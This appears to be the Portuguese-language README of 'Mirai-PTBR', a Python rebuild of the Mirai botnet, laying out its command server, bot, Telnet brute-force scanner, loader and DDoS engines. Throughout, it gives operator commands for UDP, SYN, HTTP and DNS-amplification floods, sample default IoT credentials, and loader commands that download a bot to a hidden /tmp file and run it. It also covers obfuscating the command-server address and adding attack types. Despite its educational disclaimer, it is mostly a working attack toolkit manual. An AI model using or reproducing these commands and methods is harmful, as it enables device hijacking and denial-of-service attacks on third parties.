# 📚 Documentação Técnica - Mirai-PTBR v1.0

> **Implementação educacional do Mirai Botnet em Python para testes de penetração e pesquisa de segurança.**

⚠️ **USO EXCLUSIVO PARA PROFISSIONAIS DE SEGURANÇA AUTORIZADOS**

---

## 📋 Índice

- [Visão Geral](#visão-geral)
- [Arquitetura do Projeto](#arquitetura-do-projeto)
- [Estrutura de Arquivos](#estrutura-de-arquivos)
- [Instalação](#instalação)
- [Uso Rápido](#uso-rápido)
- [Interface CLI do CNC](#interface-cli-do-cnc)
- [Módulos Detalhados](#módulos-detalhados)
- [Protocolo de Comunicação](#protocolo-de-comunicação)
- [Tipos de Ataques](#tipos-de-ataques)
- [Exemplos de Uso](#exemplos-de-uso)
- [Desenvolvimento](#desenvolvimento)

---

## Visão Geral

**Mirai-PTBR** é um Mirai botnet reimplementado em **Python puro** para fins educacionais e assessments de segurança em ambientes controlados.

### Características Principais

| Aspecto | Detalhes |
|---------|----------|
| **Linguagem** | Python 3.8+ |
| **Arquitetura** | Modular e multiplataforma |
| **Protocolo** | Binário assíncrono (asyncio/threading) |
| **Tipos de Ataque** | 8+ vetores DDoS diferentes |
| **Scanning** | SYN scan + brute force de credenciais |
| **Deploy** | HTTP/TFTP/Echo |
| **Ofuscação** | XOR, RC4, Base64 |

---

## Arquitetura do Projeto

```
┌─────────────────────────────────────────────────────────────┐
│                    CNC (Command & Control)                   │
│            Servidor asyncio na porta 7000                    │
│  - Gerencia conexões de bots                                 │
│  - Distribui comandos de ataque                              │
│  - CLI interativa para operador                              │
└──────────┬──────────────────────┬──────────────────────┬─────┘
           │                      │                      │
     ┌─────▼─────┐         ┌──────▼──────┐       ┌──────▼──────┐
     │   Bot(s)  │         │  Scanner    │       │   Loader    │
     │ [threading]         │[ThreadPool] │       │  [HTTP/TFTP]│
     └─────┬─────┘         └──────┬──────┘       └──────┬──────┘
           │                      │                      │
     ┌─────▼──────────────────────▼──────────────────────▼─────┐
     │              Attack Engines (Raw Sockets)               │
     │  ├─ UDP Flood       ├─ DNS Amplification                │
     │  ├─ SYN Flood       ├─ HTTP Flood                       │
     │  ├─ ACK Flood       ├─ VSE Attack                       │
     │  └─ (mais)          └─ (mais)                           │
     └──────────────────────────────────────────────────────────┘
```

### Fluxo de Operação

1. **Scanner** encontra dispositivos vulneráveis (Telnet aberto)
2. **Loader** injeta o binário do bot no dispositivo
3. **Bot** conecta ao servidor **CNC**
4. **Operador** usa a **CLI do CNC** para enviar comandos de ataque
5. **Bot** executa o ataque e reporta resultado

---

## Estrutura de Arquivos

```
mirai-ptbr/
│
├── main.py                  # Ponto de entrada principal (CLI)
├── requirements.txt         # Dependências Python
├── README.md               # Visão geral do projeto
├── Docs.md                 # Esta documentação
├── LICENSE                 # Licença do projeto
│
├── cnc/                    # Command & Control Server
│   ├── __init__.py
│   ├── server.py          # Servidor CNC assíncrono (asyncio)
│   ├── protocol.py        # Protocolo binário Mirai
│   ├── attack.py          # Gerenciamento de ataques
│   ├── client.py          # CLI interativa para o operador
│   └── main.py            # Inicialização do CNC
│
├── bot/                    # Cliente Bot
│   ├── __init__.py
│   ├── bot.py             # Payload principal do bot
│   ├── bot_minimal.py     # Versão comprimida
│   ├── build.sh           # Script de compilação/packaging
│   └── client.py          # Gerenciar conexão com CNC
│
├── scanner/                # Descoberta e Propagação
│   ├── __init__.py
│   ├── scanner.py         # SYN scan + Telnet brute force
│   ├── creds.py           # 62 credenciais padrão Mirai
│   ├── state_machine.py   # Máquina de estados TCP
│   └── main.py            # Inicialização do scanner
│
├── loader/                 # Deploy Automático
│   ├── __init__.py
│   ├── loader.py          # Gerenciador de deploy
│   ├── deploy.py          # Métodos de deploy (wget/tftp/echo)
│   ├── payload_builder.py # Compilação de payloads
│   ├── serve.py           # Servidor HTTP/TFTP para distribuir binário
│   └── main.py            # Inicialização do loader
│
├── attacks/                # Motores de Ataque DDoS
│   ├── __init__.py
│   ├── main.py            # Router de ataques
│   ├── udp.py             # UDP Flood
│   ├── syn.py             # SYN Flood / ACK Flood
│   ├── dns.py             # DNS Amplification Attack
│   ├── http.py            # HTTP Flood (GET/POST)
│   ├── vse.py             # Valve Source Engine Attack
│   └── (mais vetores)
│
├── tools/                  # Ferramentas Auxiliares
│   ├── __init__.py
│   ├── enc.py             # Ofuscação XOR/RC4/Base64
│   └── config_builder.py  # Gerador de config ofuscado
│
└── (diretórios opcionais)
    ├── bins/              # Binários compilados (arm, arm64, mips)
    ├── logs/              # Logs de operação
    └── configs/           # Configurações salvas

```

---

## Instalação

### Pré-requisitos

- **Python 3.8+**
- **pip** ou **venv** para gerenciar dependências
- Acesso root (para raw sockets em ataques SYN/ACK)
- Sistema Linux/Unix recomendado

### Passos de Instalação

```bash
# 1. Clone ou baixe o repositório
git clone https://github.com/seuuser/mirai-ptbr.git
cd mirai-ptbr

# 2. (Opcional) Criar ambiente virtual
python3 -m venv venv
source venv/bin/activate  # Linux/macOS
# ou
venv\Scripts\activate  # Windows

# 3. Instalar dependências
pip install -r requirements.txt

# 4. Criar diretórios necessários
mkdir -p bins logs configs

# 5. (Opcional) Testar importações
python3 -c "import cnc, bot, scanner, attacks, loader; print('[+] Imports OK')"
```

### Dependências

```
scapy>=2.4.5           # Raw sockets avançados
pyinstaller>=5.0       # (Opcional) Compilação de bot
```

A maioria das funcionalidades usa apenas **stdlib** do Python 3.8+.

---

## Uso Rápido

### Terminal 1: CNC Server

```bash
# Inicia o servidor CNC na porta 7000
python3 main.py cnc --host 0.0.0.0 --port 7000 --verbose

# Ou com configuração customizada
python3 main.py cnc --host 192.168.1.100 --port 5000
```

**Saída esperada:**
```
[*] Iniciando CNC em 0.0.0.0:7000
[+] CNC Server rodando em 0.0.0.0:7000
[+] Aguardando conexões de bots...
mirai> 
```

### Terminal 2: Bot Client

```bash
# Conecta ao CNC no localhost
python3 main.py bot --cnc-host 127.0.0.1 --cnc-port 7000 --verbose

# Ou customizado
python3 main.py bot --cnc-host 192.168.1.100 --cnc-port 5000
```

**Saída esperada:**
```
[*] Iniciando Bot, conectando ao CNC em 127.0.0.1:7000
[*] Modo verboso ativado
[+] Conectado ao CNC!
[*] Registrado como: bot-0x1a2b3c4d
[*] Aguardando comandos...
```

### Terminal 3: CLI do CNC

No terminal do CNC, você está em uma shell interativa:

```
mirai> status
[*] Bots conectados: 1
    └─ bot-0x1a2b3c4d (arch: x86_64, ip: 127.0.0.1)

mirai> attack udp 192.168.1.50 8080 60
[+] Ataque UDP iniciado contra 192.168.1.50:8080 por 60s

mirai> stop
[+] Todos os ataques pausados

mirai> help
Comandos disponíveis:
  status           - Lista bots conectados
  attack <tipo> <alvo> <porta> <duração>
  stop             - Para todos os ataques
  clear            - Limpa tela
  quit/exit        - Sai do CNC
```

### Terminal 4 (Opcional): Scanner

```bash
# Varre a rede local por dispositivos vulneráveis
python3 main.py scanner --target 192.168.1.0/24 --verbose

# Ou rede customizada
python3 main.py scanner --target 10.0.0.0/8
```

### Terminal 5 (Opcional): Loader

```bash
# Inicia servidor HTTP para distribuir binário
python3 main.py loader --verbose
```

---

## Interface CLI do CNC

### Comandos Disponíveis

#### `status`
Mostra informações sobre bots conectados.

```
mirai> status
[*] Bots conectados: 3
    ├─ bot-0x1a2b3c4d (x86_64, ip: 192.168.1.100)
    ├─ bot-0xdeadbeef (mips, ip: 192.168.1.101)
    └─ bot-0xcafebabe (arm, ip: 192.168.1.102)
```

#### `attack <tipo> <alvo> [porta] [duração]`
Inicia um ataque DDoS.

```
mirai> attack UDP 192.168.1.50 80 120
[+] UDP Attack iniciado: alvo=192.168.1.50:80, duração=120s

mirai> attack SYN 10.0.0.5 443 60
[+] SYN Flood iniciado: alvo=10.0.0.5:443, duração=60s

mirai> attack HTTP http://target.com/api 300
[+] HTTP Flood iniciado: alvo=http://target.com/api, duração=300s

mirai> attack DNS 8.8.8.8 53 180
[+] DNS Amplification iniciado: alvo=8.8.8.8:53, duração=180s
```

#### `stop` / `pause`
Para todos os ataques em execução.

```
mirai> stop
[+] Todos os ataques pausados
```

#### `bots`
Lista bots com detalhes.

```
mirai> bots
Bot ID                    Arch      IP Address       Status    Uptime
─────────────────────────────────────────────────────────────────────
bot-0x1a2b3c4d           x86_64    192.168.1.100    Online    23h45m
bot-0xdeadbeef           mips      192.168.1.101    Online    12h30m
bot-0xcafebabe           arm       192.168.1.102    Online    5h12m
```

#### `kill <bot_id>`
Encerra um bot específico.

```
mirai> kill bot-0xdeadbeef
[+] Bot bot-0xdeadbeef finalizado
```

#### `broadcast <comando>`
Envia comando broadcast para todos os bots.

```
mirai> broadcast "UPDATE_CONFIG"
[+] Comando broadcast enviado para 3 bots
```

#### `help`
Mostra todos os comandos.

#### `clear`
Limpa a tela.

#### `quit` / `exit`
Encerra o CNC.

---

## Módulos Detalhados

### 📡 **CNC (Command & Control) - `cnc/`**

O servidor central que controla toda a botnet.

#### Arquivo: `server.py`
- **Classe:** `MiraiServer`
- **Tech:** `asyncio` (assíncrono)
- **Porta:** 7000 (padrão)

**Responsabilidades:**
- Aceitar conexões de bots
- Gerenciar lista de bots conectados (UID, arquitetura, IP)
- Receber heartbeats dos bots
- Distribuir comandos de ataque
- Armazenar histórico de operações

**Métodos principais:**
```python
async def start()                # Inicia o servidor
async def handle_client()        # Processa conexão de bot
async def process_packet()       # Interpreta protocolo Mirai
def send_attack_command()        # Envia comando para bot(s)
def broadcast()                  # Envia para todos os bots
```

#### Arquivo: `protocol.py`
Define o protocolo binário Mirai.

**Classes:**
```python
class AttackType(IntEnum)  # Tipos de ataque disponíveis
class AttackCommand         # Comando de ataque serializado
class Target                # Alvo (IP, porta, opções)
class Option                # Opções customizadas do ataque
```

**Serialização:**
```python
# Formato: [4 bytes length] [1 byte type] [JSON payload]
# Exemplo:
cmd = AttackCommand(
    attack_type=AttackType.UDP,
    target="192.168.1.50",
    duration=60,
    options=[Option(key="port", value="80")]
)
bytes_data = cmd.to_bytes()
```

#### Arquivo: `client.py`
CLI interativa para o operador controlar a botnet.

**Classe:** `MiraiCLI`
- Estende `cmd.Cmd` (Python stdlib)
- Mantém histórico de comandos
- Autocomplete de comandos e IPs

**Métodos:**
```python
def do_status()       # Mostra status da botnet
def do_attack()       # Envia comando de ataque
def do_bots()         # Lista bots
def do_stop()         # Para ataques
```

---

### 🤖 **Bot (Cliente Malicioso) - `bot/`**

Payload que roda em dispositivos infectados.

#### Arquivo: `bot.py`
- **Classe:** `MiraiBot`
- **Tech:** threading

**Funcionalidades:**
- Conectar ao CNC via TCP
- Registrar-se com UID único (MAC address + UUID)
- Receber e executar comandos
- Executar ataques via `AttackRunner`
- Heartbeat periódico (a cada 30s)
- Auto-proteção (single instance, watchdog)

**Fluxo:**
```
1. Criar socket TCP
2. Conectar ao CNC
3. Enviar REGISTER:uid:arch
4. Aguardar ACCEPT
5. Loop:
   - Ler comando (AttackCommand)
   - Executar via AttackRunner
   - Enviar feedback
   - Heartbeat a cada 30s
```

#### Arquivo: `bot_minimal.py`
Versão comprimida para baixa memória (IoT).

#### Arquivo: `client.py`
Função `run_bot()` que inicia o bot.

---

### 🔍 **Scanner (Descoberta e Propagação) - `scanner/`**

Varre redes e tenta infectar dispositivos.

#### Arquivo: `scanner.py`
- **Tech:** `ThreadPoolExecutor` (paralelo)
- **Protocolo:** SYN scan na porta 23 (Telnet)

**Componentes:**

1. **IPGenerator**
   - Gera IPs aleatórios para scan
   - Ignora ranges reservados (10.0.0.0/8, 192.168.0.0/16, etc.)
   - Evita IPs já verificados

2. **PortScanner**
   - SYN scan assíncrono
   - Testa porta 23 (Telnet padrão em IoT)
   - Timeout adaptativo

3. **TelnetClient**
   - Brute force de credenciais
   - 62 credenciais padrão do Mirai
   - Detecção de prompt (ex: `#`, `$`, `login:`)

**Fluxo:**
```
1. Gerar IP aleatório (ex: 192.168.50.123)
2. SYN scan na porta 23
3. Se aberto:
   - Conectar via Telnet
   - Tentar 62 combinações username/password
   - Se sucesso: chamar Loader para injetar bot
   - Se falha: próximo IP
4. Repetir indefinidamente
```

#### Arquivo: `creds.py`
62 credenciais padrão de dispositivos IoT:

```python
DEFAULT_CREDS = [
    ("root", "xc3511"),      # Câmeras IP
    ("root", "vizxv"),       # Modem Huawei
    ("root", "admin"),       # Roteador Tp-link
    ("root", "888888"),      # DVR/NVR
    ("admin", "admin"),      # Padrão geral
    ("admin", "12345"),      # Padrão geral
    # ... + 56 mais
]
```

#### Arquivo: `state_machine.py`
Máquina de estados para gerenciar conexões TCP:

```python
class TCPState(Enum):
    CLOSED       # Fechado
    SYN_SENT     # SYN enviado
    SYN_RECEIVED # SYN+ACK recebido
    ESTABLISHED  # Conectado
    CLOSING      # Finalizando
    TERMINATED   # Morto
```

---

### 📦 **Loader (Deploy Automático) - `loader/`**

Injeta o bot em dispositivos infectados.

#### Arquivo: `deploy.py`
Implementa 3 métodos de deploy diferentes:

1. **wget**
   ```
   wget -O /tmp/.abc123 http://server/bot
   chmod +x /tmp/.abc123
   /tmp/.abc123 &
   ```

2. **tftp** (mais furtivo, sem logs)
   ```
   tftp server
   get bot /tmp/.abc123
   chmod +x /tmp/.abc123
   /tmp/.abc123 &
   ```

3. **echo** (encoded)
   ```
   echo <base64_encoded_bot> | base64 -d > /tmp/.abc123
   chmod +x /tmp/.abc123
   /tmp/.abc123 &
   ```

#### Arquivo: `serve.py`
Servidor HTTP/TFTP que distribui o binário do bot.

```bash
# Servi binário na porta 8080
python -m loader.serve --port 8080 --binary ./bins/bot-arm
```

#### Arquivo: `payload_builder.py`
Compila o bot para diferentes arquiteturas (ARM, MIPS, x86_64).

---

### ⚔️ **Attacks (Motores de Ataque) - `attacks/`**

8+ tipos de ataque DDoS diferentes.

#### Arquivo: `main.py`
Router de ataques que roteia para o vetor correto.

```python
class AttackRunner:
    def execute(cmd: AttackCommand):
        # Roteia para ataque correto
        attack_map = {
            AttackType.UDP: self._run_udp,
            AttackType.SYN: self._run_syn,
            AttackType.DNS: self._run_dns,
            AttackType.HTTP: self._run_http,
            # ...
        }
        attack_map[cmd.attack_type]()
```

#### Arquivo: `udp.py` - UDP Flood
Envia pacotes UDP aleatórios para esgotar banda.

```python
def udp_attack(target_ip: str, target_port: int, duration: int,
               threads: int = 4, randomize: bool = True)
```

**Modos:**
- `randomize=True`: Porta e payload aleatórios (padrão)
- `randomize=False`: Payload fixo (UDP_PLAIN do Mirai)

**Performance:** ~500 Mbps por thread em rede gigabit.

#### Arquivo: `syn.py` - SYN Flood / ACK Flood
Cria pacotes TCP com raw sockets (requer root).

```python
def syn_attack(src_ip: str, dst_ip: str, dst_port: int,
               duration: int, threads: int = 8)
```

**Sequência:**
1. Montar IP + TCP header
2. Calcular checksum
3. Enviar via raw socket
4. IP source é spoofed (aleatório)

**Fallback:** Se raw socket não disponível, usa TCP normal.

#### Arquivo: `dns.py` - DNS Amplification
Explora servidores DNS públicos para amplificar tráfego.

```python
def dns_amplification(target_ip: str, duration: int,
                      threads: int = 8)
```

**Mecanismo:**
1. Lista de 15+ DNS servers públicos
2. Query do tipo `ANY` (máxima amplificação, ~64x)
3. IP source spoofed para target
4. Resposta DNS grande vai para target

**Amplificação:** ~60x (1 byte enviado = 60 bytes resposta)

#### Arquivo: `http.py` - HTTP Flood
Envia requisições HTTP (GET/POST) em massa.

```python
def http_flood(url: str, duration: int, 
               threads: int = 10, method: str = "GET")
```

**Features:**
- Suporta GET e POST
- User-Agent aleatório (evita bloqueios simples)
- Referer aleatório
- Headers customizados
- SSL/TLS support

**Performance:** ~1000 req/s por thread.

#### Arquivo: `vse.py` - Valve Source Engine Attack
Ataca servidores Source Engine (Half-Life 2, CS:GO, etc.).

```python
def vse_attack(target_ip: str, target_port: int, duration: int)
```

Explora o reconhecimento do servidor Source Engine.

---

### 🛠️ **Tools (Ferramentas) - `tools/`**

Utilitários auxiliares.

#### Arquivo: `enc.py` - Ofuscação
Ofusca strings sensíveis (CNC hostname, portas, etc.).

**Métodos:**
1. **XOR** (compatível com original Mirai)
   ```bash
   python tools/enc.py string "meu.cnc.com"
   # Output: \xf2\xee\xf0\xfe\xcf...
   ```

2. **XOR Rotativo**
   ```bash
   python tools/enc.py --method xor-rot string "senha"
   ```

3. **RC4**
   ```bash
   python tools/enc.py --method rc4 string "config"
   ```

4. **XOR + Base64** (dupla camada)
   ```bash
   python tools/enc.py --method xor-b64 string "token"
   ```

**Uso no bot:**
```python
from tools.enc import xor_encrypt, xor_decrypt

# Ofuscar
cnc_host_enc = xor_encrypt(b"212.192.246.164", key=0xDEADBEEF)

# Desofuscar no bot
cnc_host = xor_decrypt(cnc_host_enc, key=0xDEADBEEF)
```

---

## Protocolo de Comunicação

### Conexão Inicial

```
Bot → CNC: REGISTER:uid:arch
            └─ Exemplo: REGISTER:bot-0x1a2b3c4d:x86_64

CNC → Bot: ACCEPT
            └─ Confirma registro
```

### Envio de Comando

```
CNC → Bot: [4 bytes: comprimento] [1 byte: tipo] [JSON]
           ┌─────────────────────────────────────────┐
           │ {                                       │
           │   "type": 0,  // AttackType.UDP         │
           │   "target": "192.168.1.50",             │
           │   "duration": 60,                       │
           │   "options": [                          │
           │     {"key": "port", "value": "80"},     │
           │     {"key": "threads", "value": "4"}    │
           │   ]                                     │
           │ }                                       │
           └─────────────────────────────────────────┘

Bot → CNC: {
  "type": "attack_start",
  "attack_type": "UDP",
  "status": "OK"
}
```

### Heartbeat (a cada 30s)

```
Bot → CNC: {
  "type": "heartbeat",
  "bot_id": "bot-0x1a2b3c4d",
  "uptime_seconds": 3600,
  "current_attack": null
}
```

### Parada de Ataque

```
CNC → Bot: {
  "type": "stop",
  "attack_id": "attack-12345"
}

Bot → CNC: {
  "type": "attack_stop",
  "status": "OK"
}
```

---

## Tipos de Ataques

| ID | Tipo | Porta | Descrição | Pré-requisitos |
|----|------|-------|-----------|-----------------|
| 0 | UDP | Variável | UDP Flood com payload aleatório | Nenhum |
| 1 | SYN | 23/80/443 | SYN Flood com IP spoofed | raw sockets (root) |
| 2 | ACK | Variável | ACK Flood com IP spoofed | raw sockets (root) |
| 3 | HTTP | 80/443 | HTTP GET/POST Flood | socket.AF_INET |
| 4 | DNS | 53 | DNS Amplification (53x) | DNS resolvers públicos |
| 5 | GREIP | Variável | GRE Tunnel IP-in-IP | raw sockets |
| 6 | GREETH | Variável | GRE Tunnel Ethernet | raw sockets |
| 7 | VSE | 27015+ | Valve Source Engine query | Source de query |
| 8 | STOMP | 61613 | STOMP protocol flood | Port 61613 |

### Padrões de Uso

```bash
# UDP simples
attack UDP 192.168.1.50 80 120

# SYN Flood com duração longa
attack SYN 10.0.0.5 443 300

# HTTP Flood contra URL específica
attack HTTP http://target.com:8080/api 60

# DNS Amplification
attack DNS 8.8.8.8 53 180

# Múltiplos portos
attack UDP 192.168.1.50 [80,443,8080] 60
```

---

## Exemplos de Uso

### Exemplo 1: Ataque UDP Simples

**Terminal 1 (CNC):**
```bash
$ python3 main.py cnc
[+] CNC Server rodando em 0.0.0.0:7000
mirai> status
[*] Bots conectados: 1
    └─ bot-0x1a2b3c4d (x86_64, 127.0.0.1)
```

**Terminal 2 (Bot):**
```bash
$ python3 main.py bot
[+] Conectado ao CNC!
[*] Registrado como: bot-0x1a2b3c4d
```

**Terminal 1 (CNC):**
```bash
mirai> attack UDP 192.168.1.50 80 30
[+] UDP Attack iniciado: alvo=192.168.1.50:80, duração=30s

# Aguardar 30 segundos...

[+] Ataque finalizado
```

### Exemplo 2: Múltiplos Bots

```bash
# Terminal 3: Segundo bot
$ CNC_PORT=7000 python3 main.py bot --cnc-port 7000

# Terminal 4: Terceiro bot
$ CNC_PORT=7000 python3 main.py bot --cnc-port 7000

# Terminal 1 (CNC): Ver todos os bots
mirai> bots
Bot ID                    Arch      IP         Status
─────────────────────────────────────────────────────────
bot-0x1a2b3c4d           x86_64    127.0.0.1  Online
bot-0xdeadbeef           x86_64    127.0.0.1  Online
bot-0xcafebabe           x86_64    127.0.0.1  Online

# Ataque simultâneo com todos os 3 bots
mirai> attack UDP 192.168.1.50 80 60
[+] Ataque distribuído para 3 bots
```

### Exemplo 3: HTTP Flood Contra Website

```bash
mirai> attack HTTP http://alvo.com:80/api 300
[+] HTTP Flood iniciado contra alvo.com por 300s

# Monitorar durante o ataque
mirai> status
[*] Bots em ataque: 3
  └─ bot-0x1a2b3c4d: HTTP Flood (alvo.com:80/api, 245s restantes)
```

### Exemplo 4: DNS Amplification Distribuído

```bash
# Com 3 bots, cada um usando ~8 threads
mirai> attack DNS 8.8.8.8 53 600
[+] DNS Amplification contra 8.8.8.8 por 600s

# Cada bot:
# - Contacta 15+ DNS servers públicos
# - Envia 8 queries por segundo por thread (64 q/s total)
# - Gera ~64x amplificação (resposta DNS > query)
# - Tráfego estimado: 3 bots × 64 q/s × 100 bytes = 19.2 Mbps
```

---

## Desenvolvimento

### Adicionar Novo Tipo de Ataque

1. **Criar arquivo** em `attacks/novo_ataque.py`:

```python
# attacks/novo_ataque.py
import threading

def novo_ataque(target_ip: str, target_port: int, duration: int,
                stop_event: threading.Event = None, threads: int = 4):
    """Descrição do novo ataque."""
    
    if stop_event is None:
        stop_event = threading.Event()
    
    def worker():
        # Implementar lógica de ataque aqui
        pass
    
    # Criar threads worker
    thread_pool = []
    for i in range(threads):
        t = threading.Thread(target=worker)
        t.start()
        thread_pool.append(t)
    
    # Aguardar conclusão
    for t in thread_pool:
        t.join()
```

2. **Registrar em** `attacks/protocol.py`:

```python
class AttackType(IntEnum):
    # ... tipos existentes
    NOVO = 9  # Novo tipo
```

3. **Adicionar rota em** `attacks/main.py`:

```python
class AttackRunner:
    attack_map = {
        # ...
        AttackType.NOVO: self._run_novo,
    }
    
    def _run_novo(self, cmd: AttackCommand):
        from novo_ataque import novo_ataque
        novo_ataque(
            target_ip=cmd.target,
            target_port=cmd.options.get('port', 80),
            duration=cmd.duration
        )
```

4. **Usar via CLI:**

```bash
mirai> attack NOVO 192.168.1.50 80 60
```

### Criar Extensão de Scanner

```python
# scanner/custom_scanner.py

class CustomScanner:
    def __init__(self, target_range):
        self.target_range = target_range
    
    def scan(self):
        # Implementar scanning customizado
        for ip in self.generate_ips():
            if self.is_vulnerable(ip):
                self.report_vulnerable(ip)
```

### Configuração Ofuscada

```bash
# Ofuscar configuração sensível
python3 tools/enc.py --generate-table > bot/config_table.py

# Usar no bot
from config_table import OBFUSCATED_CONFIG
cnc_host = OBFUSCATED_CONFIG['cnc_host']
```

---

## Troubleshooting

### "Port already in use"
```bash
# Encontrar processo usando porta 7000
lsof -i :7000

# Matar processo
kill -9 <PID>

# Ou usar porta diferente
python3 main.py cnc --port 8000
```

### "Permission denied" ao executar raw sockets
```bash
# Alguns ataques (SYN/ACK) requerem root
sudo python3 main.py bot
```

### Bot não conecta ao CNC
```bash
# Verificar se CNC está rodando
netstat -tlnp | grep 7000

# Verificar firewall
sudo ufw allow 7000/tcp  # Ubuntu

# Bot deve ter IP:porta correto
python3 main.py bot --cnc-host <IP_DO_CNC> --cnc-port 7000
```

### Scanner não encontra dispositivos
```bash
# Verificar se porta 23 (Telnet) está aberta
nmap 192.168.1.0/24 -p 23

# Se sem Telnet, será necessário adaptar creds/porta
# Ver scanner/scanner.py para customizar
```

---

## Referências

- **Mirai Original:** https://github.com/jgamblin/Mirai-Source-Code
- **Scapy Docs:** https://scapy.readthedocs.io/
- **Raw Sockets:** https://en.wikipedia.org/wiki/Raw_socket
- **DDoS Vectors:** https://owasp.org/www-community/attacks/Denial_of_Service

---

## Licença

Ver [LICENSE](LICENSE) para detalhes legais.

---

## Aviso Legal

⚠️ **Este projeto é apenas para fins educacionais e pesquisa de segurança autorizada.**

O uso não autorizado de ferramentas DDoS é **ILEGAL** sob:
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act 1990 - UK
- Lei de Crimes Cibernéticos - Brasil
- Leis equivalentes em outros países

**Uso indevido resultará em processos criminais e civis.**